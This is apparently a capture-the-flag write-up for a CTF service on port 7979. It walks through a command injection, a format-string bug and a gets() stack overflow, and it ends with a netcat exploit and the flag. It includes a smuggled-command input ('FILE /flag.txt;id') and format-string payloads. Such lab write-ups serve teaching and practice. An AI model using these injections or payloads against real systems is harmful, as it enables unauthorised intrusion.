# Transaction — Writeup

## Service

A TCP daemon on port 7979. Connect and send one of three commands: `HELP`, `PAYCHECK`, `FILE`.

## Vulnerabilities

### 1. `FILE` — Command Injection (easiest)

```c
sprintf(cmd, "cat %s", buffer + 5);
system(cmd);
```

The argument after `FILE ` is passed directly to `system()` via `cat <arg>`.
Shell metacharacters are not escaped.

```
FILE /flag.txt;id
```

### 2. `PAYCHECK` — Format String

```c
gets(pass);
printf(pass);   // pass is attacker-controlled
```

After sending `PAYCHECK`, the server prompts for a password. Send a format string:

```
%x.%x.%x.%x    → leak stack values
%n              → arbitrary write to stack address
```

Use a format string to overwrite the return address or a GOT entry.

### 3. `PAYCHECK` — Stack Buffer Overflow

```c
char pass[256];
gets(pass);     // no bounds check — classic gets() BOF
```

`pass` is 256 bytes. `gets()` reads until newline with no limit.
Send > 256 bytes to smash the stack; overwrite the saved return address.

The binary was compiled for Windows 2000 (x86, Cygwin) — no ASLR, no stack canary.

## Exploit (FILE — command injection)

```bash
echo -e "FILE /flag.txt" | nc <host> 7979
```

## Flag

`FLAG_ICTF2002{gets_printf_and_system_walk_into_a_bar}`
